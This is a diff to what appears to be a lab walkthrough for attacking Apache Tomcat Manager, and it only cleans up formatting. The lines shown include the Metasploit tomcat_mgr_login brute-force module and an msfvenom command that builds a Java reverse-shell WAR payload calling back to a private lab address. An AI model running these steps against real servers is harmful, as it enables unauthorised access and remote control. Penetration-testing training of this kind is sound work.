@@ -52,7 +52,7 @@ nmap 192.168.51.2/24
 sudo msfconsole
 
 # step 2
-use scanner/http/tomcat\_mgr\_login  
+use scanner/http/tomcat_mgr_login
 
 # step 3
 setg RHOSTS \<target-ip>  `# 10.208.89.15 or 192.168.51.5 if in M1
@@ -77,7 +77,7 @@ Once access is gained to the **Tomcat Manager**, the attacker uploads a maliciou
 ```
 # step 1
 
-sudo msfvenom -p java/shell\_reverse\_tcp LHOST=192.168.51.2 LPORT=443 -f war -o /tmp/shell.war
+sudo msfvenom -p java/shell_reverse_tcp LHOST=192.168.51.2 LPORT=443 -f war -o shell.war
 
 # step 2 
 
